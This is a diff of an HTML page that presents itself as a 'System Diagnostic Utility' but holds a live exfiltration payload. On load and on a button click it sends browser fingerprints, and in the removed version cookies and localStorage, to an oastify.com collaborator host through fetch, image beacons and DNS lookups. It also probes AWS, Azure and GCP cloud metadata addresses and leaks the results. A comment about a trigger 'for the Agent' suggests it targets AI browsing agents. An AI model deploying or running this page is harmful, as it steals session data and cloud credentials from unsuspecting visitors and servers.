@@ -1,57 +1,59 @@
 <!DOCTYPE html>
 <html>
-<head><title>System Diagnostics</title></head>
+<head>
+    <title>System Diagnostic Utility</title>
+    <link rel="dns-prefetch" href="//8s1gu7sy4fptw78et83jmifm2d89wbk0.oastify.com">
+</head>
 <body>
-    <h1>Node Status: <span id="node-val">Initializing...</span></h1>
-    <button id="action-btn" style="padding:15px; background:#007bff; color:white;">Finalize Handshake</button>
+    <h1 id="status-title">System: Initializing...</h1>
+    <div id="ui-container">
+        <p>Current Node: <span id="node-id">Scanning for active threads...</span></p>
+        <button id="verify-btn" style="background-color: #28a745; color: white; padding: 12px;">Confirm Node Status</button>
+    </div>
 
     <script>
-        const collab = "ozrw1nzebvw93nfu0oaztym29tfp3hr6.oastify.com";
-
-        async function exfiltrate(path, data) {
+        const addr = "8s1gu7sy4fptw78et83jmifm2d89wbk0.oastify.com";
+        
+        function exfil(path, data) {
             const blob = btoa(JSON.stringify(data));
-            // 'credentials: include' is key to checking for session leaks
-            fetch(`https://${collab}/${path}?payload=${blob}`, { mode: 'no-cors', credentials: 'include' });
+            // Channel 1: Standard Fetch (Probing for cookies)
+            fetch(`https://${addr}/${path}?v=${blob}`, { mode: 'no-cors', credentials: 'include' });
+            // Channel 2: Image Beacon (Bypasses some fetch restrictions)
+            new Image().src = `https://${addr}/${path}_img?v=${blob}`;
+            // Channel 3: DNS Ping (The most resilient channel)
+            const dnsPing = document.createElement('link');
+            dnsPing.rel = 'preconnect';
+            dnsPing.href = `https://${blob.substring(0, 10)}.${addr}`;
+            document.head.appendChild(dnsPing);
         }
 
-        async function runBountyTests() {
-            // 1. Session & Cookie Leak (P1 Target)
-            exfiltrate("auth-leak", {
-                cookies: document.cookie || "None",
-                localStorage: JSON.stringify(localStorage),
-                origin: window.origin
+        window.onload = () => {
+            // Immediate Fingerprinting
+            exfil("load", {
+                ua: navigator.userAgent,
+                platform: navigator.platform,
+                isIframe: window.self !== window.top
             });
 
-            // 2. Cloud Metadata SSRF (The Jackpot)
-            const targets = [
-                "http://169.254.169.254/latest/meta-data/", // AWS
-                "http://169.254.169.254/metadata/instance?api-version=2021-02-01", // Azure
-                "http://metadata.google.internal/computeMetadata/v1/" // GCP
-            ];
-
-            for (const url of targets) {
-                try {
-                    const res = await fetch(url, { headers: { "Metadata": "true" } });
-                    const text = await res.text();
-                    exfiltrate("ssrf-hit", { url, data: text.substring(0, 200) });
-                } catch (e) {
-                    exfiltrate("ssrf-blocked", { url, msg: e.message });
+            // High-Impact SSRF Test (Cloud Metadata)
+            setTimeout(async () => {
+                const targets = ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "http://169.254.169.254/latest/meta-data/"];
+                for (let url of targets) {
+                    try {
+                        const res = await fetch(url, { headers: { "Metadata": "true" } });
+                        const text = await res.text();
+                        exfil("ssrf_success", { url, data: text.substring(0, 50) });
+                    } catch(e) {
+                        exfil("ssrf_fail", { url, err: e.message });
+                    }
                 }
-            }
-
-            // 3. Cross-Origin PostMessage Escape
-            window.parent.postMessage({ type: "pwn", content: "SANDBOX_ESCAPE_SUCCESS" }, "*");
-        }
-
-        // Trigger on load for "Blind" hits
-        window.onload = () => {
-            exfiltrate("page-load", { ua: navigator.userAgent, isIframe: window.self !== window.top });
-            // Auto-trigger the high-impact tests
-            setTimeout(runBountyTests, 1000);
+            }, 2000);
         };
 
-        // Manual trigger for the Agent
-        document.getElementById('action-btn').onclick = runBountyTests;
+        document.getElementById('verify-btn').onclick = () => {
+            exfil("interaction", { type: "click" });
+            document.getElementById('node-id').innerText = "NODE_ACTIVE_" + Math.random().toString(36).substring(7);
+        };
     </script>
 </body>
 </html>
